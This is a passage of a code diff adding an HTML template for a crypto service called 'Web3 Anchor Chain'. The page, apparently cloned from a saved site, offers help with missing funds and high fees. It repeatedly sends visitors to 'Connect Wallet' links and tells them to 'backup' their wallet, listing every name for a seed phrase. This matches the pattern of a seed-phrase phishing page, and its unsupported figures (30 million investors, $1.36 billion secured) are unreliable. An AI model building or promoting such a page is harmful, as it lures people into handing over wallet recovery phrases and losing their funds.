+                            const currentValue = start + (change * easeProgress);
+                
+                            if (isDecimal) {
+                                this[property] = currentValue.toFixed(2);
+                            } else {
+                                this[property] = Math.floor(currentValue);
+                            }
+                
+                            if (progress &lt; 1) {
+                                setTimeout(animate, 16);
+                            } else {
+                                if (isDecimal) {
+                                    this[property] = end.toFixed(2);
+                                } else {
+                                    this[property] = end;
+                                }
+                            }
+                        };
+                
+                        animate();
+                    }
+                }" x-intersect.once="startCounting" @click="startCounting"
+                    class="col-span-12 gap-6 grid grid-cols-12 xl:divide-x divide-gray-700/60 pt-20 relative z-10"
+                    bis_skin_checked="1">
+                    <div class="col-span-6 md:col-span-3" bis_skin_checked="1">
+                        <h3 class="text-3xl xl:text-4xl font-bold mb-3">
+                            <span class="text-secondary-500 count-up-number" x-text="countries">63</span>+
+                        </h3>
+                        <p class="text-gray-200 lg:text-lg">Countries Covered</p>
+                    </div>
+                    <div class="col-span-6 md:col-span-3 xl:pl-8" bis_skin_checked="1">
+                        <h3 class="text-3xl xl:text-4xl font-bold mb-3">
+                            <span class="text-accent-500 count-up-number" x-text="investors">30</span> Million
+                        </h3>
+                        <p class="text-gray-200 lg:text-lg">Global Investors</p>
+                    </div>
+                    <div class="col-span-6 md:col-span-3 xl:pl-8" bis_skin_checked="1">
+                        <h3 class="text-3xl xl:text-4xl font-bold mb-3">
+                            <span class="text-secondary-600 count-up-number" x-text="wallets">700</span>+
+                        </h3>
+                        <p class="text-gray-200 lg:text-lg">Secured Wallet</p>
+                    </div>
+                    <div class="col-span-6 md:col-span-3 xl:pl-8" bis_skin_checked="1">
+                        <h3 class="text-3xl xl:text-4xl font-bold mb-3">
+                            $<span class="text-accent-600 count-up-number" x-text="volume">1.36</span> Billion
+                        </h3>
+                        <p class="text-gray-200 lg:text-lg">Secured Volume</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Features Section -->
+        <section class="bg-gray-800 relative overflow-hidden">
+            <div class="container mx-auto px-4 py-20" bis_skin_checked="1">
+                <div class="grid grid-cols-12 gap-4 mb-10 xl:mb-16" bis_skin_checked="1">
+                    <div class="col-span-12 md:col-span-12 xl:col-span-4" bis_skin_checked="1">
+                        <h2 class="text-3xl xl:text-4xl font-bold fade-up">
+                            Find &amp; Secure
+                            <span class="gradient-text">crypto</span>
+                            Now!
+                        </h2>
+                    </div>
+                    <div class="col-span-12 md:col-span-12 xl:col-span-4 xl:col-start-9" bis_skin_checked="1">
+                        <p class="text-gray-100 lg:text-lg fade-up">
+                            Our comprehensive cybersecurity platform, driven by artificial intelligence, not only
+                            safeguards your organization.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-12 gap-6" bis_skin_checked="1">
+                    <div class="fade-up col-span-12 md:col-span-6 xl:col-span-4 bg-gray-700 rounded-xl p-6 xl:p-8 flex-col flex justify-between hover:bg-gray-600 transition-all duration-300"
+                        bis_skin_checked="1">
+                        <div bis_skin_checked="1">
+                            <h3 class="text-xl font-bold mb-3 text-white">Connect to Dapps</h3>
+                            <p class="text-gray-100 lg:text-lg">
+                                Connect decentralized apps to mobile wallets and enable DAPP.
+                            </p>
+                        </div>
+                        <img src="{% static '/Home - Web3 Anchor Chain_files/globe-2.png'%}" class="lg:-ml-5 mt-6 max-w-full h-auto"
+                            alt="Globe">
+                    </div>
+
+                    <div class="fade-up col-span-12 md:col-span-6 xl:col-span-4 bg-gray-700 rounded-xl p-6 xl:p-8 hover:bg-gray-600 transition-all duration-300"
+                        bis_skin_checked="1">
+                        <h3 class="text-xl font-bold mb-3 text-white">Missing Funds</h3>
+                        <p class="text-gray-100 lg:text-lg">
+                            Lost access to funds or missing funds?
+                        </p>
+                        <div class="flex justify-end" bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/trade.png'%}"
+                                class="lg:-mr-5 -mt-9 max-w-full h-auto" alt="Trade">
+                        </div>
+                    </div>
+
+                    <div class="fade-up col-span-12 md:col-span-6 xl:col-span-4 bg-gray-700 rounded-xl p-6 xl:p-8 hover:bg-gray-600 transition-all duration-300"
+                        bis_skin_checked="1">
+                        <h3 class="text-xl font-bold mb-3 text-white">High Fee</h3>
+                        <p class="text-gray-100 lg:text-lg">
+                            Transaction fees too high?
+                        </p>
+                        <div class="flex justify-end" bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/spot.png'%}" class="lg:-mr-5 max-w-full h-auto"
+                                alt="Spot">
+                        </div>
+                    </div>
+
+                    <div class="fade-up col-span-12 md:col-span-6 xl:col-span-4 bg-gray-700 rounded-xl p-6 xl:p-8 hover:bg-gray-600 transition-all duration-300"
+                        bis_skin_checked="1">
+                        <h3 class="text-xl font-bold mb-3 text-white">24/7 Support</h3>
+                        <p class="text-gray-100 lg:text-lg">
+                            Count on us for round-the-clock support, help whenever you need it.
+                        </p>
+                        <div class="flex justify-between items-end" bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/bitcoin-2.png'%}"
+                                class="max-md:hidden max-w-full h-auto" alt="Bitcoin">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/support.png'%}" class="lg:-mr-5 max-w-full h-auto"
+                                alt="Support">
+                        </div>
+                    </div>
+
+                    <div class="fade-up col-span-12 md:col-span-6 xl:col-span-4 bg-gray-700 rounded-xl p-6 xl:p-8 hover:bg-gray-600 transition-all duration-300"
+                        bis_skin_checked="1">
+                        <h3 class="text-xl font-bold mb-3 text-white">Trusted &amp; Secure</h3>
+                        <p class="text-gray-100 lg:text-lg">
+                            Your assets. On your terms. At your fingertips.
+                        </p>
+                        <div class="flex justify-between items-end" bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/coins.png'%}"
+                                class="max-md:hidden max-w-full h-auto" alt="Coins">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/trusted.png'%}"
+                                class="lg:-mr-5 -mt-4 max-w-full h-auto" alt="Trusted">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Explore Web3 Section -->
+        <section class="bg-gray-900 relative overflow-hidden">
+            <!-- Background Elements -->
+            <div class="max-lg:hidden w-64 xl:w-80 h-64 xl:h-80 absolute bottom-[-6%] blur-[85px] left-[-12%] bg-primary-500/30"
+                bis_skin_checked="1">
+            </div>
+            <div class="max-lg:hidden w-64 xl:w-80 h-64 xl:h-80 absolute top-[-6%] blur-[85px] right-[-8%] bg-secondary-500/30"
+                bis_skin_checked="1">
+            </div>
+            <img class="max-md:hidden absolute right-5 top-12 animate-slow-rotate"
+                src="{% static '/Home - Web3 Anchor Chain_files/globe.png'%}" alt="">
+            <img class="max-lg:hidden absolute left-[5%] top-[46%] animate-slow-rotate-reverse"
+                src="{% static '/Home - Web3 Anchor Chain_files/bitcoin.png'%}" alt="">
+
+            <div class="container mx-auto px-4 py-20 relative z-10" bis_skin_checked="1">
+                <div class="mb-10 xl:mb-16 flex flex-wrap justify-between items-center gap-5" bis_skin_checked="1">
+                    <div class="max-w-lg" bis_skin_checked="1">
+                        <h2 class="text-3xl xl:text-4xl font-bold mb-4 fade-up">
+                            Explore
+                            <span class="gradient-text">Web3</span>
+                        </h2>
+                        <p class="text-gray-100 lg:text-lg fade-up">
+                            It is the easiest, safest, and fastest way to secure &amp; backup crypto asset.
+                        </p>
+                    </div>
+                    <a href="content-wallet#"
+                        class="bg-gradient-to-r from-primary-500 to-secondary-500 hover:from-primary-600 hover:to-secondary-600 text-white font-semibold px-8 py-3 rounded-full transition-all duration-300 transform hover:scale-105">
+                        View More
+                    </a>
+                </div>
+
+                <div class="mb-10 lg:mb-16" bis_skin_checked="1">
+                    <!-- Swiper Container -->
+                    <div class="swiper web3-carousel swiper-initialized swiper-horizontal swiper-backface-hidden"
+                        bis_skin_checked="1">
+                        <div class="swiper-wrapper" bis_skin_checked="1"
+                            style="transition-duration: 0ms; transform: translate3d(-2130px, 0px, 0px); transition-delay: 0ms;">
+                            <!-- Slide 1 -->
+
+
+                            <!-- Slide 2 -->
+
+
+                            <!-- Slide 3 -->
+
+
+                            <!-- Slide 4 -->
+
+
+                            <!-- Slide 5 -->
+
+
+                            <!-- Slide 6 -->
+
+
+                            <!-- Slide 7 -->
+
+
+                            <!-- Slide 8 -->
+
+                            <div class="swiper-slide" style="width: 396px; margin-right: 30px;"
+                                data-swiper-slide-index="2" bis_skin_checked="1">
+                                <div class="group bg-gray-800 hover:bg-gray-700 duration-300 px-6 lg:px-10 py-8 rounded-xl border border-gray-600 flex flex-col items-center text-center h-full"
+                                    bis_skin_checked="1">
+                                    <div class="w-20 h-20 rounded-full group-hover:bg-primary-500 border border-primary-500 flex justify-center items-center mb-6 xl:mb-8"
+                                        bis_skin_checked="1">
+                                        <img src="{% static '/Home - Web3 Anchor Chain_files/bitcoin-2.png'%}"
+                                            alt="Crypto Derivatives" class="w-10 h-10">
+                                    </div>
+                                    <h4 class="text-xl font-semibold mb-3 text-white">Crypto Derivatives</h4>
+                                    <p class="text-gray-200 mb-6 lg:mb-8 lg:text-lg">
+                                        We are the best crypto exchange for trading crypto futures.
+                                    </p>
+                                    <a href="content-wallet?crypto="
+                                        class="text-base lg:text-lg xl:text-xl font-medium group-hover:text-primary-500 group-hover:underline">
+                                        View Details
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide" style="width: 396px; margin-right: 30px;"
+                                data-swiper-slide-index="3" bis_skin_checked="1">
+                                <div class="group bg-gray-800 hover:bg-gray-700 duration-300 px-6 lg:px-10 py-8 rounded-xl border border-gray-600 flex flex-col items-center text-center h-full"
+                                    bis_skin_checked="1">
+                                    <div class="w-20 h-20 rounded-full group-hover:bg-secondary-600 border border-secondary-600 flex justify-center items-center mb-6 xl:mb-8"
+                                        bis_skin_checked="1">
+                                        <img src="{% static '/Home - Web3 Anchor Chain_files/coins.png'%}" alt="Web3Earn"
+                                            class="w-10 h-10">
+                                    </div>
+                                    <h4 class="text-xl font-semibold mb-3 text-white">Web3Earn</h4>
+                                    <p class="text-gray-200 mb-6 lg:mb-8 lg:text-lg">
+                                        Invest and earn steady income with the help of a professional asset manager.
+                                    </p>
+                                    <a href="content-wallet?staking="
+                                        class="text-base lg:text-lg xl:text-xl font-medium group-hover:text-secondary-600 group-hover:underline">
+                                        View Details
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide" style="width: 396px; margin-right: 30px;"
+                                data-swiper-slide-index="4" bis_skin_checked="1">
+                                <div class="group bg-gray-800 hover:bg-gray-700 duration-300 px-6 lg:px-10 py-8 rounded-xl border border-gray-600 flex flex-col items-center text-center h-full"
+                                    bis_skin_checked="1">
+                                    <div class="w-20 h-20 rounded-full group-hover:bg-accent-600 border border-accent-600 flex justify-center items-center mb-6 xl:mb-8"
+                                        bis_skin_checked="1">
+                                        <img src="{% static '/Home - Web3 Anchor Chain_files/coin-1.png'%}" alt="Buy Crypto"
+                                            class="w-10 h-10">
+                                    </div>
+                                    <h4 class="text-xl font-semibold mb-3 text-white">Buy Crypto</h4>
+                                    <p class="text-gray-200 mb-6 lg:mb-8 lg:text-lg">
+                                        Purchase crypto quickly and easily on our popular and industry-leading platform.
+                                    </p>
+                                    <a href="content-wallet?crypto="
+                                        class="text-base lg:text-lg xl:text-xl font-medium group-hover:text-accent-600 group-hover:underline">
+                                        View Details
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide" style="width: 396px; margin-right: 30px;"
+                                data-swiper-slide-index="5" bis_skin_checked="1">
+                                <div class="group bg-gray-800 hover:bg-gray-700 duration-300 px-6 lg:px-10 py-8 rounded-xl border border-gray-600 flex flex-col items-center text-center h-full"
+                                    bis_skin_checked="1">
+                                    <div class="w-20 h-20 rounded-full group-hover:bg-accent-500 border border-accent-500 flex justify-center items-center mb-6 xl:mb-8"
+                                        bis_skin_checked="1">
+                                        <img src="{% static '/Home - Web3 Anchor Chain_files/support.png'%}" alt="Advanced Trading"
+                                            class="w-10 h-10">
+                                    </div>
+                                    <h4 class="text-xl font-semibold mb-3 text-white">Advanced Trading</h4>
+                                    <p class="text-gray-200 mb-6 lg:mb-8 lg:text-lg">
+                                        Borrow, trade, and repay. Leverage your assets with margin trading.
+                                    </p>
+                                    <a href="content-wallet?web3="
+                                        class="text-base lg:text-lg xl:text-xl font-medium group-hover:text-accent-500 group-hover:underline">
+                                        View Details
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide swiper-slide-prev" style="width: 396px; margin-right: 30px;"
+                                data-swiper-slide-index="6" bis_skin_checked="1">
+                                <div class="group bg-gray-800 hover:bg-gray-700 duration-300 px-6 lg:px-10 py-8 rounded-xl border border-gray-600 flex flex-col items-center text-center h-full"
+                                    bis_skin_checked="1">
+                                    <div class="w-20 h-20 rounded-full group-hover:bg-primary-600 border border-primary-600 flex justify-center items-center mb-6 xl:mb-8"
+                                        bis_skin_checked="1">
+                                        <img src="{% static '/Home - Web3 Anchor Chain_files/globe.png'%}" alt="NFT Trading"
+                                            class="w-10 h-10">
+                                    </div>
+                                    <h4 class="text-xl font-semibold mb-3 text-white">NFT Trading</h4>
+                                    <p class="text-gray-200 mb-6 lg:mb-8 lg:text-lg">
+                                        Discover, buy, and sell unique digital assets in our NFT marketplace.
+                                    </p>
+                                    <a href="content-wallet?nft="
+                                        class="text-base lg:text-lg xl:text-xl font-medium group-hover:text-primary-600 group-hover:underline">
+                                        View Details
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide swiper-slide-active" style="width: 396px; margin-right: 30px;"
+                                data-swiper-slide-index="7" bis_skin_checked="1">
+                                <div class="group bg-gray-800 hover:bg-gray-700 duration-300 px-6 lg:px-10 py-8 rounded-xl border border-gray-600 flex flex-col items-center text-center h-full"
+                                    bis_skin_checked="1">
+                                    <div class="w-20 h-20 rounded-full group-hover:bg-secondary-600 border border-secondary-600 flex justify-center items-center mb-6 xl:mb-8"
+                                        bis_skin_checked="1">
+                                        <img src="{% static '/Home - Web3 Anchor Chain_files/rocket.png'%}" alt="Launchpad"
+                                            class="w-10 h-10">
+                                    </div>
+                                    <h4 class="text-xl font-semibold mb-3 text-white">Launchpad</h4>
+                                    <p class="text-gray-200 mb-6 lg:mb-8 lg:text-lg">
+                                        Get early access to promising new crypto projects and tokens.
+                                    </p>
+                                    <a href="content-wallet?web3="
+                                        class="text-base lg:text-lg xl:text-xl font-medium group-hover:text-secondary-600 group-hover:underline">
+                                        View Details
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide swiper-slide-next" style="width: 396px; margin-right: 30px;"
+                                data-swiper-slide-index="0" bis_skin_checked="1">
+                                <div class="group bg-gray-800 hover:bg-gray-700 duration-300 px-6 lg:px-10 py-8 rounded-xl border border-gray-600 flex flex-col items-center text-center h-full"
+                                    bis_skin_checked="1">
+                                    <div class="w-20 h-20 rounded-full group-hover:bg-secondary-500 border border-secondary-500 flex justify-center items-center mb-6 xl:mb-8"
+                                        bis_skin_checked="1">
+                                        <img src="{% static '/Home - Web3 Anchor Chain_files/spot.png'%}" alt="Spot Trading"
+                                            class="w-10 h-10">
+                                    </div>
+                                    <h4 class="text-xl font-semibold mb-3 text-white">Spot Trading</h4>
+                                    <p class="text-gray-200 mb-6 lg:mb-8 lg:text-lg">
+                                        Trade crypto with our comprehensive set of powerful tools to maximize your
+                                        profits.
+                                    </p>
+                                    <a href="content-wallet?crypto="
+                                        class="text-base lg:text-lg xl:text-xl font-medium group-hover:text-secondary-500 group-hover:underline">
+                                        View Details
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide" style="width: 396px; margin-right: 30px;"
+                                data-swiper-slide-index="1" bis_skin_checked="1">
+                                <div class="group bg-gray-800 hover:bg-gray-700 duration-300 px-6 lg:px-10 py-8 rounded-xl border border-gray-600 flex flex-col items-center text-center h-full"
+                                    bis_skin_checked="1">
+                                    <div class="w-20 h-20 rounded-full group-hover:bg-accent-500 border border-accent-500 flex justify-center items-center mb-6 xl:mb-8"
+                                        bis_skin_checked="1">
+                                        <img src="{% static '/Home - Web3 Anchor Chain_files/trade.png'%}" alt="Margin Trading"
+                                            class="w-10 h-10">
+                                    </div>
+                                    <h4 class="text-xl font-semibold mb-3 text-white">Margin Trading</h4>
+                                    <p class="text-gray-200 mb-6 lg:mb-8 lg:text-lg">
+                                        Borrow, trade, and repay. Leverage your assets with margin trading.
+                                    </p>
+                                    <a href="content-wallet?defi="
+                                        class="text-base lg:text-lg xl:text-xl font-medium group-hover:text-accent-500 group-hover:underline">
+                                        View Details
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Navigation buttons -->
+                        <div class="swiper-button-next !text-primary-400 !w-10 !h-10 !mt-0 !top-1/2 !right-0"
+                            bis_skin_checked="1"></div>
+                        <div class="swiper-button-prev !text-primary-400 !w-10 !h-10 !mt-0 !top-1/2 !left-0"
+                            bis_skin_checked="1"></div>
+
+                        <!-- Pagination -->
+                        <div class="swiper-pagination !bottom-0 !relative !mt-8 swiper-pagination-clickable swiper-pagination-bullets swiper-pagination-horizontal"
+                            bis_skin_checked="1"><span class="swiper-pagination-bullet"></span><span
+                                class="swiper-pagination-bullet"></span><span
+                                class="swiper-pagination-bullet"></span><span
+                                class="swiper-pagination-bullet"></span><span
+                                class="swiper-pagination-bullet"></span><span
+                                class="swiper-pagination-bullet"></span><span
+                                class="swiper-pagination-bullet"></span><span
+                                class="swiper-pagination-bullet swiper-pagination-bullet-active"></span></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- How To Get Started Section -->
+        <section class="bg-gray-900 relative overflow-hidden">
+            <!-- Background Elements -->
+            <div class="max-lg:hidden w-64 h-72 absolute bottom-0 blur-[85px] left-[-12%] bg-secondary-500/30"
+                bis_skin_checked="1"></div>
+            <div class="max-lg:hidden w-64 h-72 absolute top-[-6%] blur-[85px] right-[-8%] bg-primary-400/30"
+                bis_skin_checked="1"></div>
+            <img class="max-md:hidden absolute left-0 bottom-3 animate-slow-rotate"
+                src="{% static '/Home - Web3 Anchor Chain_files/rocket.png'%}" alt="">
+
+            <div class="container mx-auto px-4 py-20" bis_skin_checked="1">
+                <h2 class="text-3xl xl:text-4xl font-bold text-center mb-10 xl:mb-16 fade-up">
+                    How To Get
+                    <span class="gradient-text">Started</span>
+                </h2>
+
+                <div class="grid grid-cols-12 gap-4 xl:gap-6 relative text-center" bis_skin_checked="1">
+                    <!-- Background card -->
+                    <div class="absolute inset-0 bg-gray-800 rounded-xl z-0 top-[5%] h-[90%]" bis_skin_checked="1">
+                    </div>
+
+                    <div class="fade-up col-span-12 md:col-span-6 xl:col-span-3 p-4 lg:p-6 xl:px-8 xl:py-10 rounded-xl bg-gradient-to-r from-primary-400 to-secondary-500 flex flex-col items-center relative z-10"
+                        bis_skin_checked="1">
+                        <div class="w-15 h-15 text-black text-2xl flex items-center justify-center rounded-full bg-white mb-4 xl:mb-6"
+                            bis_skin_checked="1">
+                            <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z">
+                                </path>
+                            </svg>
+                        </div>
+                        <h4 class="text-xl font-bold mb-4 xl:mb-6 text-black">Connect wallet</h4>
+                        <p class="mb-7 xl:mb-10 lg:text-lg text-black">
+                            Click connect wallet button.
+                        </p>
+                        <a href="content-wallet?secure="
+                            class="bg-white text-black font-semibold px-6 py-2 rounded-full hover:bg-gray-100 transition-all inline-block">
+                            Connect Wallet
+                        </a>
+                    </div>
+
+                    <div class="fade-up col-span-12 md:col-span-6 xl:col-span-3 p-4 lg:p-6 xl:px-8 xl:py-10 rounded-xl flex flex-col items-center relative z-10"
+                        bis_skin_checked="1">
+                        <div class="w-15 h-15 text-2xl flex items-center justify-center rounded-full bg-gray-600 mb-4 xl:mb-6"
+                            bis_skin_checked="1">
+                            <h5 class="text-white font-bold">02</h5>
+                        </div>
+                        <h4 class="text-xl font-bold mb-4 xl:mb-6 text-white">Select Wallet</h4>
+                        <p class="mb-7 xl:mb-10 text-gray-200 lg:text-lg">
+                            Choose your preferred wallet to backup and click on connect.
+                        </p>
+                    </div>
+
+                    <div class="fade-up col-span-12 md:col-span-6 xl:col-span-3 p-4 lg:p-6 xl:px-8 xl:py-10 rounded-xl flex flex-col items-center relative z-10"
+                        bis_skin_checked="1">
+                        <div class="w-15 h-15 text-2xl flex items-center justify-center rounded-full bg-gray-600 mb-4 xl:mb-6"
+                            bis_skin_checked="1">
+                            <h5 class="text-white font-bold">03</h5>
+                        </div>
+                        <h4 class="text-xl font-bold mb-4 xl:mb-6 text-white">Backup your wallet</h4>
+                        <p class="mb-7 xl:mb-10 text-gray-200 lg:text-lg">
+                            Your wallet backup may also be referred to as a: <b class="text-primary-400">backup</b>, <b
+                                class="text-secondary-400">recovery seed</b>,
+                            <b class="text-accent-400">seed</b>, <b class="text-primary-500">seed phrase</b>, <b
+                                class="text-secondary-500">BIP-39 seed phrase</b>, <b
+                                class="text-primary-400">mnemonic</b>, <b class="text-secondary-400">recovery
+                                phrase</b>.
+                        </p>
+                    </div>
+
+                    <div class="fade-up col-span-12 md:col-span-6 xl:col-span-3 p-4 lg:p-6 xl:px-8 xl:py-10 rounded-xl flex flex-col items-center relative z-10"
+                        bis_skin_checked="1">
+                        <div class="w-15 h-15 text-2xl flex items-center justify-center rounded-full bg-gray-600 mb-4 xl:mb-6"
+                            bis_skin_checked="1">
+                            <h5 class="text-white font-bold">04</h5>
+                        </div>
+                        <h4 class="text-xl font-bold mb-4 xl:mb-6 text-white">Start your journey</h4>
+                        <p class="mb-7 xl:mb-10 text-gray-200 lg:text-lg">
+                            Having a safe wallet backup means you can recover your Bitcoin in case of hardware failure
+                            or the loss of your device.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Wallet Backup & Recovery Section -->
+        <section class="bg-gray-900 relative overflow-hidden">
+            <!-- Background Elements -->
+            <div class="max-lg:hidden w-64 xl:w-80 h-64 xl:h-80 absolute bottom-[-6%] blur-[85px] left-[-12%] bg-primary-400/30"
+                bis_skin_checked="1">
+            </div>
+            <div class="max-lg:hidden w-64 xl:w-80 h-64 xl:h-80 absolute top-[-6%] blur-[85px] right-[-8%] bg-accent-500/30"
+                bis_skin_checked="1">
+            </div>
+            <img class="max-md:hidden absolute right-5 top-12 animate-slow-rotate"
+                src="{% static '/Home - Web3 Anchor Chain_files/globe.png'%}" alt="">
+            <img class="max-lg:hidden absolute left-[5%] bottom-[6%] animate-slow-rotate-reverse"
+                src="{% static '/Home - Web3 Anchor Chain_files/bitcoin.png'%}" alt="">
+
+            <div class="container mx-auto px-4 py-20 grid grid-cols-12 gap-6 xl:gap-10 items-center relative z-10"
+                bis_skin_checked="1">
+                <div class="col-span-12 lg:col-span-5" bis_skin_checked="1">
+                    <img src="{% static '/Home - Web3 Anchor Chain_files/get-started-recovery-phrase.png'%}"
+                        class="fade-up max-w-full h-auto" alt="Wallet Recovery">
+                </div>
+                <div class="col-span-12 lg:col-span-7" bis_skin_checked="1">
+                    <h2 class="text-3xl xl:text-4xl font-bold mb-4 fade-up">
+                        How does wallet backup and recovery work?
+                    </h2>
+                    <div class="fade-up rounded-3xl p-4 lg:p-6 xl:p-8 bg-gray-800 border border-gray-600 flex gap-4 flex-wrap items-center justify-between"
+                        bis_skin_checked="1">
+                        <div class="max-w-sm" bis_skin_checked="1">
+                            <h3 class="text-xl font-bold mb-3 text-white">Secure</h3>
+                            <p class="lg:text-lg text-gray-200">
+                                First, we need to talk a little bit about how crypto wallets work. Crypto wallets work
+                                by holding cryptographic keys that are used to prove you have control over crypto assets
+                                on a blockchain. Whenever you wish to do something with your crypto assets, you instruct
+                                the blockchain and use your private cryptographic key as a sort of digital signature to
+                                approve your desired action.
+                            </p>
+                        </div>
+                        <a href="content-wallet?secure="
+                            class="bg-gradient-to-r from-primary-400 to-secondary-500 hover:from-primary-500 hover:to-secondary-600 text-white font-semibold px-8 py-3 rounded-full transition-all duration-300 transform hover:scale-105 inline-block">
+                            Connect Wallet
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- FAQ Section -->
+        <section class="bg-gray-800 relative overflow-hidden">
+            <!-- Background Elements -->
+            <div class="max-lg:hidden w-80 h-80 absolute bottom-[-6%] blur-[85px] left-[-12%] bg-secondary-500/30"
+                bis_skin_checked="1">
+            </div>
+
+            <div class="container mx-auto px-4 py-20 grid grid-cols-12 gap-6 xl:gap-10 items-center relative z-10"
+                bis_skin_checked="1">
+                <div class="fade-up col-span-12 lg:col-span-5 p-4 lg:p-6 xl:p-8 bg-gray-900 border border-gray-600 rounded-xl"
+                    bis_skin_checked="1">
+                    <p class="text-lg font-semibold mb-3">FAQ</p>
+                    <h2 class="text-3xl xl:text-4xl font-bold mb-4">
+                        Your questions
+                        <span class="gradient-text">answered.</span>
+                    </h2>
+                    <p class="text-gray-100 mb-6 text-lg xl:mb-10">
+                        Let's do our best to answer your most frequently asked questions.
+                    </p>
+                    <div class="bg-gray-700 p-5 rounded-xl" bis_skin_checked="1">
+                        <div class="flex gap-3 flex-wrap items-center mb-6" bis_skin_checked="1">
+                            <div class="w-20 h-20 shrink-0 rounded-xl border border-white flex items-center justify-center"
+                                bis_skin_checked="1">
+                                <div class="w-8 h-8 rounded-full bg-primary-400 text-black text-2xl flex items-center justify-center"
+                                    bis_skin_checked="1">
+                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                            d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z">
+                                        </path>
+                                    </svg>
+                                </div>
+                            </div>
+                            <div bis_skin_checked="1">
+                                <h5 class="text-xl font-semibold mb-3 text-white">Still have questions?</h5>
+                                <p class="text-gray-200 text-sm">
+                                    Can't find the answer you're looking for? Please chat to our friendly team!
+                                </p>
+                            </div>
+                        </div>
+                        <a href="content-wallet?secure="
+                            class="bg-gradient-to-r from-primary-400 to-secondary-500 hover:from-primary-500 hover:to-secondary-600 text-white font-semibold px-8 py-3 rounded-full transition-all duration-300 transform hover:scale-105 inline-block">
+                            Connect Wallet
+                        </a>
+                    </div>
+                </div>
+
+                <div x-data="{ opened: 2, handleOpen(i) { this.opened === i ? this.opened = 0 : this.opened = i } }"
+                    class="col-span-12 lg:col-span-7 p-4 lg:p-6 xl:p-8 bg-gray-900 border border-gray-600 rounded-xl flex flex-col gap-4"
+                    bis_skin_checked="1">
+                    <div :class="opened == 1 ? &#39;bg-gray-700&#39; : &#39;&#39;"
+                        class="fade-up p-4 rounded-xl border border-gray-600 cursor-pointer" @click="handleOpen(1)"
+                        bis_skin_checked="1">
+                        <div class="flex justify-between items-center" bis_skin_checked="1">
+                            <p class="text-sm lg:text-base xl:text-xl font-medium text-white">
+                                How can I secure my wallet?
+                            </p>
+                            <span :class="opened == 1 ? &#39;bg-primary-400 rotate-180&#39; : &#39;bg-gray-700&#39;"
+                                class="w-8 h-8 md:w-10 md:h-10 cursor-pointer rounded-full flex items-center justify-center text-lg shrink-0 md:text-2xl duration-300 bg-gray-700">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </span>
+                        </div>
+                        <div x-show="opened === 1" x-collapse="" style="display: none; height: 0px; overflow: hidden;"
+                            hidden="" bis_skin_checked="1">
+                            <p class="text-sm lg:text-base xl:text-lg pt-3 text-gray-200">
+                                Set a unique passcode for your wallet.
+                            </p>
+                            <p class="text-sm lg:text-base xl:text-lg pt-3 text-gray-200">
+                                Also, make sure the numbers are random. Birthdays, anniversaries, house addresses, and
+                                the last digits of your phone number are all popular combinations and are crackable
+                                codes to a resourceful criminal.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div :class="opened == 2 ? &#39;bg-gray-700&#39; : &#39;&#39;"
+                        class="fade-up p-4 rounded-xl border border-gray-600 cursor-pointer bg-gray-700"
+                        @click="handleOpen(2)" bis_skin_checked="1">
+                        <div class="flex justify-between items-center" bis_skin_checked="1">
+                            <p class="text-sm lg:text-base xl:text-xl font-medium text-white">
+                                How to backup a crypto wallet?
+                            </p>
+                            <span :class="opened == 2 ? &#39;bg-secondary-400 rotate-180&#39; : &#39;bg-gray-700&#39;"
+                                class="w-8 h-8 md:w-10 md:h-10 cursor-pointer rounded-full flex items-center justify-center text-lg shrink-0 md:text-2xl duration-300 bg-secondary-400 rotate-180">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </span>
+                        </div>
+                        <div x-show="opened === 2" x-collapse="" bis_skin_checked="1">
+                            <p class="text-sm lg:text-base xl:text-lg pt-3 text-gray-200">
+                                Your wallet backup may also be referred to as a: backup, recovery seed, seed, seed
+                                phrase, BIP-39 seed phrase, mnemonic, recovery phrase.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div :class="opened == 3 ? &#39;bg-gray-700&#39; : &#39;&#39;"
+                        class="fade-up p-4 rounded-xl border border-gray-600 cursor-pointer" @click="handleOpen(3)"
+                        bis_skin_checked="1">
